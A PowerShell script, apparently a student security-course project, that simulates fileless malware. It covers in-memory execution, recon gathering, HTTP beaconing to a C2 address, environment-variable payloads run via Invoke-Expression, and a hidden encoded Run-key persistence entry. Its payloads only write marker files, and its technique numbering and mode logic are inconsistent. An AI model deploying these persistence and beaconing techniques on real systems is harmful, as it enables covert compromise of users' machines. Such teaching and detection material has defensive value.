<#
.SYNOPSIS
    Fileless Malware Simulation Script
    IT 359 Final Project - Hack the Blocks
    
.DESCRIPTION
    This PowerShell script simulates fileless malware techniques
    by executing commands entirely in memory without writing to disk.
    
    Techniques demonstrated:
    1. In-memory script execution (no files written to disk)
    2. System reconnaissance gathering
    3. HTTP beaconing to C2 server
    4. Registry-based persistence (demo only - Not Executed)
    5. Environment variable abuse
    6. WMI event subscription (demo only - Not Executed)
    7. Process hollowing concept
    
.NOTES
    WARNING: This script is for authorized testing only.
    
    Authors: Zac Davis, Caleb Clauson
    Course: IT 359 - Spring 2026
    
.PARAMETER Verbose
    Enable verbose output for demonstration purposes
    
.PARAMETER DemoMode
    If set to $true, the script will ONLY LOG actions and WILL NOT
    EXECUTE them on the system. (Current mode)
    
.PARAMETER LiveMode
    If set to $true, the script WILL ACTUATE the system, making changes
    in memory, registry, and network calls.

.PARAMETER C2Server
    The IP address or hostname of your Command and Control (C2) server.
    
.PARAMETER C2Port
    The port number of your C2 server.
#>
param(
    [switch]$Verbose,
    [switch]$DemoMode,
    [switch]$LiveMode,
    [string]$C2Server = '10.0.0.249',
    [int]$C2Port = 8080
)

# Set defaults for switches when they were not explicitly provided
if (-not $PSBoundParameters.ContainsKey('DemoMode')) { $DemoMode = $true }
if (-not $PSBoundParameters.ContainsKey('Verbose'))  { $Verbose = $false }
if (-not $PSBoundParameters.ContainsKey('LiveMode'))  { $LiveMode = $false }
# Global State
$Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
$Global:C2Url = "http://${C2Server}:${C2Port}"
# Normalize and assign mode switches (ensure booleans)
$DemoMode = [bool]$DemoMode
$LiveMode = [bool]$LiveMode
$Global:DemoMode = $DemoMode
$Global:LiveMode = $LiveMode

# ===========================================================================
# SETUP AND HELPER FUNCTIONS
# ==========================================================================

# Check for required cmdlets (these are built-in to PowerShell)
$missing = @()
if (-not (Get-Command -Name Invoke-RestMethod -ErrorAction SilentlyContinue)) {
    $missing += 'Invoke-RestMethod'
}
if (-not (Get-Command -Name Invoke-WebRequest -ErrorAction SilentlyContinue)) {
    $missing += 'Invoke-WebRequest'
}
if ($missing.Count -gt 0) {
    Write-Warning "Required cmdlets missing: $($missing -join ', ')"
    Write-Host "Ensure you're running a full PowerShell (Windows PowerShell or PowerShell Core). These cmdlets are built-in; no module installation should be necessary." -ForegroundColor Red
    exit 1
}

# Global flag to determine if we are running in DEMO or LIVE mode
$Global:DemoMode = $DemoMode
$Global:LiveMode = $LiveMode

# ===========================================================================
# LOGGING FUNCTION
# ==========================================================================
function Write-Log {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    if ($Verbose) {
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor Gray
    }
}

# ===========================================================================
# DISPLAY BANNER
# ==========================================================================
function Show-Banner {
    Write-Host ""
    Write-Host "+-------------------------------------------------------------+-" -ForegroundColor Red
    Write-Host "|    FILELESS MALWARE SIMULATION - EDUCATIONAL ONLY            |" -ForegroundColor Red
    Write-Host "|         IT 359 Final Project - Hack the Blocks                   |" -ForegroundColor Red
    Write-Host "+-------------------------------------------------------------+-" -ForegroundColor Red
    Write-Host ""
    Write-Host "[!] WARNING: This script is for authorized testing only!" -ForegroundColor Yellow
    Write-Host "[*] Session ID: $Global:UniqueId" -ForegroundColor Cyan
    Write-Host "[*] C2 Server: $Global:C2Url" -ForegroundColor Cyan
    Write-Host ""
    
    if ($Global:DemoMode) {
        Write-Host "[!] DEMO MODE ACTIVE. NO ACTUAL CHANGES WILL BE MADE TO THE SYSTEM." -ForegroundColor Yellow
    } elseif ($Global:LiveMode) {
        Write-Host "[!] LIVE MODE ACTIVE. ACTIONS WILL BE PERFORMED ON THE SYSTEM." -ForegroundColor Red
    }
    Write-Host ""
}

# ==========================================================================
# TECHNIQUES
# ==========================================================================

# TECHNIQUE 1: SYSTEM RECONNAISSANCE
# Gather system info entirely in memory without writing to disk
# ==========================================================================
function Get-SystemRecon {
    Write-Host ""
    Write-Host "[+] Technique 1: In-Memory System Reconnaissance" -ForegroundColor Green
    
    # All data stored in memory, never written to disk
    $recon = @{
        Hostname = $env:COMPUTERNAME
        Username = $env:USERNAME
        Domain = $env:USERDOMAIN
        OS = (Get-CimInstance Win32_OperatingSystem).Caption
        Architecture = $env:PROCESSOR_ARCHITECTURE
        IPAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }).IPAddress
        CurrentDirectory = (Get-Location).Path
        PowerShellVersion = $PSVersionTable.PSVersion.ToString()
        IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        SessionId = $Global:UniqueId
    }
    
    if ($Global:DemoMode) {
        Write-Host "    [*] Gathered system information (LOGGING ONLY):" -ForegroundColor Gray
        Write-Host "        - Hostname: $($recon.Hostname)" -ForegroundColor Gray
        Write-Host "        - Username: $($recon.Username)" -ForegroundColor Gray
        Write-Host "        - OS: $($recon.OS)" -ForegroundColor Gray
        Write-Host "        - Domain: $($recon.Domain)" -ForegroundColor Gray
        Write-Host "        - Admin: $($recon.IsAdmin)" -ForegroundColor Gray
        Write-Host "        - Timestamp: $($recon.Timestamp)" -ForegroundColor Gray
    }
    
    return $recon
}

# ==========================================================================
# TECHNIQUE 2: HTTP BEACONING TO C2
# Send data to C2 server without writing files to disk
# ==========================================================================
function Send-Beacon {
    param(
        [hashtable]$Data,
        [string]$Endpoint = "/register"
    )
    
    Write-Host "[+] Technique 2: HTTP Beacon to C2 Server" -ForegroundColor Green
    
    try {
        # Convert data to JSON in memory
        $jsonData = $Data | ConvertTo-Json -Compress
        
        Write-Host "    [*] Preparing beacon to: $Global:C2Url$Endpoint" -ForegroundColor Gray
        Write-Host "    [*] Payload size: $($jsonData.Length) bytes" -ForegroundColor Gray
        
        # Send HTTP POST request (data never touches disk)
        $requestParams = @{
            Uri = "$Global:C2Url$Endpoint"
            Method = "POST"
            Body = $jsonData
            ContentType = "application/json"
            ErrorAction = "Stop"
        }
        
        $response = Invoke-RestMethod @requestParams
        
        if ($Global:DemoMode) {
            Write-Host "    [OK] Beacon sent successfully (LOGGED ONLY)." -ForegroundColor Green
        } else {
            Write-Host "    [OK] Beacon sent successfully to C2 server." -ForegroundColor Green
        }
        return $response
    }
    catch {
        Write-Error "    [!] Beacon failed (C2 server not running?): $($_.Exception.Message)" -ForegroundColor Yellow
        return $null
    }
}

# ==========================================================================
# TECHNIQUE 3: IN-MEMORY CODE EXECUTION
# ==========================================================================
function Invoke-MemoryExecution {
    Write-Host "[+] Technique 3: In-Memory Code Execution" -ForegroundColor Green
    
    # Code stored as string, executed via ScriptBlock creation
    $inMemoryScript = @'
$result = @{
    Technique = "In-Memory Execution"
    ProcessId = $PID
    ExecutionTime = Get-Date -Format "HH:mm:ss"
    Note = "This code was never written to disk"
}
return $result
'@
    
    if ($Global:DemoMode) {
        Write-Host "    [*] Executing script block from memory..." -ForegroundColor Gray
        Write-Host "    [*] Script never touches disk - runs directly from RAM" -ForegroundColor Gray
    }
    
    # Execute the in-memory script by creating a ScriptBlock from the string
    $scriptBlock = [ScriptBlock]::Create($inMemoryScript)
    $result = & $scriptBlock
    
    if ($Global:DemoMode) {
        Write-Host "    [OK] In-memory execution completed (PID: $($result.ProcessId))" -ForegroundColor Green
    } else {
        Write-Host "    [LIVE] Execution complete. Result: $($result | Out-String)" -ForegroundColor Green
    }
    
    return $result
}


# ==========================================================================
# TECHNIQUE 4: ENVIRONMENT VARIABLE ABUSE
# Store payload in env vars (process-level, not persistent)
# ==========================================================================
function Set-EnvPayload {
    Write-Host "[+] Technique 4: Environment Variable Payload Storage" -ForegroundColor Green
    
    # Define a more visible payload: get system info and log it to a file.
    $payload = 'Add-Content -Path "C:\temp\execution_marker.txt" -Value "Payload executed by user: $(whoami)"'
    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    
    # Store in environment variable (process-level, not persistent)
    [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $encodedPayload, "Process")

    if ($Global:DemoMode) {
        Write-Host "    [*] Payload stored in env var: DEMO_PAYLOAD" -ForegroundColor Gray
        Write-Host "    [*] Encoded payload length: $($encodedPayload.Length) chars" -ForegroundColor Gray
    }

    # Retrieve and decode
    $retrieved = [Environment]::GetEnvironmentVariable("DEMO_PAYLOAD", "Process")
    if ($retrieved) {
        $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($retrieved))

        if ($Global:DemoMode) {
            Write-Host "    [*] (DEMO) Decoded payload: $decoded" -ForegroundColor Gray
            Write-Host "    [*] Not executing payload in Demo Mode." -ForegroundColor Yellow
        }
        else {
            Write-Host "    [LIVE] Executing payload from environment variable..." -ForegroundColor Green
            Invoke-Expression $decoded
        }
    }
    else {
        Write-Host "    [!] No payload found in env var 'DEMO_PAYLOAD'." -ForegroundColor Yellow
    }

    # Clean up
    [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $null, "Process")
    Write-Host "    [OK] Environment variable cleaned up." -ForegroundColor Green
}


# ==========================================================================
# TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
# ==========================================================================
function Show-RegistryPersistence {
   Write-Host "[+] Technique 7: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green

    Write-Host "[+] Technique 5: Registry-Based Persistence" -ForegroundColor Green

    $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $regKeyName = 'DemoApp'

    # Payload to create an execution marker at user logon
    $payload = 'Add-Content -Path "C:\temp\execution_marker.txt" -Value "Successfully executed payload via Reg Run Key."'
    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    $runValue = "powershell.exe -WindowStyle Hidden -EncodedCommand $encodedPayload"

    if ($Global:DemoMode) {
        Write-Host "    [*] Demonstrating registry-based persistence concepts (LOGGING ONLY):" -ForegroundColor Gray
        Write-Host "    [*] Target key: $registryPath" -ForegroundColor Gray
        Write-Host "    [*] Example Run value (not written):" -ForegroundColor Gray
        Write-Host "      $runValue" -ForegroundColor DarkGray
        Write-Host "" 
        Write-Host "    [DEMO] Blue Team should monitor Run/RunOnce keys for suspicious entries." -ForegroundColor Yellow
    }
    else {
        # Ensure C:\temp exists so the payload can write to it at logon
        if (-not (Test-Path -Path 'C:\temp')) {
            try {
                New-Item -Path 'C:\temp' -ItemType Directory -Force | Out-Null
                Write-Host "    [LIVE] Created folder C:\temp" -ForegroundColor Green
            }
            catch {
                Write-Error "    [!] Failed to create C:\temp: $($_.Exception.Message)"
                return
            }
        }

        try {
            Set-ItemProperty -Path $registryPath -Name $regKeyName -Value $runValue -Type String -Force -ErrorAction Stop
            Write-Host "    [LIVE] Successfully set registry persistence key: $registryPath\$regKeyName" -ForegroundColor Green
        }
        catch {
            Write-Error "    [!] Failed to set registry key: $($_.Exception.Message)"
        }
    }
}

function Show-WMIEventSub {
    Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green

    if ($Global:DemoMode) {
        Write-Host "    [*] WMI subscriptions allow code execution without files:" -ForegroundColor Gray
        Write-Host "    [*] - Event Filter: Defines trigger condition" -ForegroundColor Gray
        Write-Host "    [*] - Event Consumer: Defines action (PowerShell command)" -ForegroundColor Gray
        Write-Host "" 
        Write-Host "    [DEMO] Example command that WOULD be used (not executed):" -ForegroundColor Yellow
        Write-Host "    $EventFilter = New-WmiEventFilter -Name 'EventSubscription' -Query 'SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA \\"Win32_Process\\"'" -ForegroundColor DarkGray
        Write-Host "    $EventConsumer = New-WmiEventConsumer -Name 'EventSubscription' -ScriptText 'powershell.exe -EncodedCommand <base64_payload>'" -ForegroundColor DarkGray
        Write-Host "" 
        Write-Host "    [DEMO] This technique is a key detection target for Blue Team!" -ForegroundColor Yellow
    }
}
function Show-ProcessHollowing {
    Write-Host "[+] Technique 7: Process Hollowing Concept" -ForegroundColor Green
    
    if ($Global:DemoMode) {
        Write-Host "    [*] Demonstrating process hollowing concepts:" -ForegroundColor Gray
        Write-Host "    [*] 1. Start suspended legitimate process (e.g., svchost.exe)" -ForegroundColor Gray
        Write-Host "    [*] 2. Unmap/hollow out its memory" -ForegroundColor Gray
        Write-Host "    [*] 3. Inject malicious code" -ForegroundColor Gray
        Write-Host "    [*] 4. Resume process - appears legitimate to monitoring" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    [DEMO] Requires Windows API calls - shown conceptually only" -ForegroundColor Yellow
    }
}

# ==========================================================================
# BEACON LOOP
# ==========================================================================
function Start-BeaconLoop {
    param([int]$Interval = 30)
    
    Write-Host ""
    Write-Host "[*] Starting beacon loop (Interval: ${Interval}s, Ctrl+C to stop)" -ForegroundColor Cyan
    Write-Host ""
    
    $iteration = 0
    while ($true) {
        $iteration++
        Write-Host "[Beacon $iteration] $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor DarkCyan
        
        $beaconData = @{
            SessionId = $Global:UniqueId
            Iteration = $iteration
            Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            Status = "Active"
        }
        
        $response = Send-Beacon -Data $beaconData -Endpoint "/register"
        
        if ($response -and $response.command) {
            Write-Host "    [!] Received command from C2: $($response.command)" -ForegroundColor Magenta
            # In real malware, commands would be executed here
        }
        
        Start-Sleep -Seconds $Interval
    }
}

# ==========================================================================
# MAIN EXECUTION
# ==========================================================================
function Start-Simulation {
    Clear-Host
    Show-Banner
    
    Write-Host ""
    Write-Host "-------------- Techniques Demonstration Start --------------" -ForegroundColor DarkGray
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Write-Host ""
    
    # Run Reconnaissance (always runs)
    $reconData = Get-SystemRecon
    Write-Host ""
    
    # Execute techniques
    Invoke-MemoryExecution
    Set-EnvPayload
    Show-RegistryPersistence
    Show-WMIEventSub
    Show-ProcessHollowing
    
    # Start Beaconing (only runs in Live Mode)
    if (-not $Global:DemoMode) {
        Write-Host ""
        Write-Host "==========================================================" -ForegroundColor DarkGray
        Write-Host "       STARTING BEACON LOOP (Press Ctrl+C to stop)        " -ForegroundColor Green
        Write-Host "==========================================================" -ForegroundColor DarkGray
        Start-BeaconLoop -Interval 10
    }
    
    Write-Host ""
    Write-Host "--- Simulation Complete ---" -ForegroundColor DarkGray
    Write-Host "=========================================================" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "[*] Demo Mode: No changes made to the system." -ForegroundColor Cyan
    Write-Host "[+] Live Mode: All actions were executed." -ForegroundColor Green
    Write-Host ""
}

# ==========================================================================
# SCRIPT ENTRY POINT
# ==========================================================================

# Check parameters and start
if ($Global:LiveMode) {
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Write-Host "          LIVE MODE ACTIVE" -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Start-Simulation
}
else {
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Write-Host "           DEMO MODE ACTIVE" -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Start-Simulation
}
